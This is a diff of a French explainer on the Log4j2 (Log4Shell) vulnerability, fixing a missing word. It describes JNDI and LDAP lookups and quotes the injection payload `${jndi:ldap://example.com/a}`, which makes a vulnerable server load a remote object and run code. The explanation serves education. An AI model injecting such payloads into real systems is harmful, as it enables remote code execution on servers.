@@ -13,7 +13,7 @@ Log4j2 est une librairie Java permettant de générer... des logs, c'est comme l
 
 ## 💥 Exploitation 
 
-L'exploitation de cette vulnérabilité est triviale, une simple suite de caractères comme `${jndi:ldap://example.com/a}` d'obtenir une RCE (Remote Code Execution) sur le serveur distant.
+L'exploitation de cette vulnérabilité est triviale, une simple suite de caractères comme `${jndi:ldap://example.com/a}` permet d'obtenir une RCE (Remote Code Execution) sur le serveur distant.
 
 JNDI est l'acronyme de "Java Naming and Directory Interface", c'est une fonction de Java qui permet d'interroger des directories afin d'obtenir en retour un objet java. Un directory, c'est une sorte de base de donnée principalement utilisée en entreprise qui stocke des informations comme par exemple les utilisateurs, leurs droits, etc. On peut citer ActiveDirectory ou encore LDAP comme exemple de directory bien connu. Java, à travers JNDI, supporte le directory open source bien connu LDAP. La syntaxe `jndi:ldap://example.com/a` interroge le serveur LDAP sur le serveur example.com et va télécharger l'objet a.
 
